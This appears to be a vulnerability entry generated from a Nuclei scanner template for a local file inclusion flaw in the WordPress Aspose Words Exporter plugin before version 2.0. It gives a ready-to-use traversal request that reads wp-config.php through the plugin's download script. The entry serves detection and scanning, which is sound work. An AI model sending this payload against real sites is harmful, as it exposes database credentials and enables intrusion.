# Nuclei Template: WordPress Aspose Words Exporter <2.0 - Local File Inclusion
**Template ID:** aspose-words-file-download
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`aspose-words-file-download.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Aspose Words Exporter prior to version 2.0 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php
```

## References
- https://wpscan.com/vulnerability/7869
- https://wordpress.org/plugins/aspose-doc-exporter
